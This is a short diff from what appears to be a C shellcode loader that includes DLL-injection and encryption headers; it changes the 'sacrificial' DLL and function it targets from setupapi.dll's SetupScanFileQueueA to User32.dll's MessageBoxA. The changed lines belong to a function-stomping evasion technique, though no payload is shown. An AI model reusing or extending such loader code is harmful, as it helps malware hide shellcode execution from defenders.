@@ -13,7 +13,7 @@
 #include "Encryption.h"
 #include  "dllinjection.h"
 
-#define		SACRIFICIAL_DLL          "setupapi.dll"
-#define		SACRIFICIAL_FUNC         "SetupScanFileQueueA"
+#define		SACRIFICIAL_DLL          "User32.dll"
+#define		SACRIFICIAL_FUNC         "MessageBoxA"
 
 typedef  VOID(WINAPI* fnShellCode)();
